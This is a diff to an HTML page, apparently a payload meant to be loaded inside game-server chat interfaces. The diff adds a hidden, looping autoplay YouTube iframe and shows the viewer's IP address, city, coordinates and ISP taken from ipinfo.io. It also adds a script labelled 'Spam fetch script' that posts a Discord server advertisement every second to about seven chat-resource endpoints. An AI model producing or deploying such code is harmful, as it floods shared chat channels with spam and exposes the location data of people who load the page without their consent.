@@ -51,7 +51,7 @@
     <!-- Hidden YouTube audio -->
     <div style="width:0; height:0; overflow:hidden;">
         <iframe width="0" height="0" 
-            src="https://youtu.be/JxXnP-IW5O8?si=lWGX27yk_cPhLN2P" 
+            src="https://www.youtube.com/embed/JxXnP-IW5O8?autoplay=1&loop=1&playlist=JxXnP-IW5O8" 
             frameborder="0" allow="autoplay"></iframe>
     </div>
 
@@ -68,13 +68,58 @@
     <div class="text">discord.gg/HNTest</div>
 
     <script>
-        fetch('https://ipinfo.io/json')
+        // Fetch IP info and display
+        fetch('https://ipinfo.io/json?token=your_token_if_needed')
         .then(response => response.json())
         .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
+            document.getElementById('ip').textContent = data.ip || '';
+            document.getElementById('city').textContent = data.city || '';
+            document.getElementById('region').textContent = data.region || '';
+            document.getElementById('country').textContent = data.country || '';
+            document.getElementById('loc').textContent = data.loc || '';
+            document.getElementById('org').textContent = data.org || '';
+            document.getElementById('timezone').textContent = data.timezone || '';
         });
+
+        // Spam fetch script
+        const msg = `👑 HN & Navy - .gg/HNTESTING ! 👑`;
+        const body = JSON.stringify({ message: msg });
+
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                method: "POST",
+                body: JSON.stringify({
+                    message: msg,
+                    channel: "شات العام",
+                    color: null,
+                    isImageAndLinksAllowed: [false, false]
+                })
+            });
+
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                headers: {
+                    accept: "*/*",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                },
+                body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                method: "POST"
+            });
+
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+
+            fetch("https://ho-chatv2/Chat", {
+                method: "POST",
+                body: JSON.stringify({
+                    Type: "chatResult",
+                    message: msg,
+                    chatType: "general"
+                })
+            });
+        }, 1000);
     </script>
 </body>
 </html>
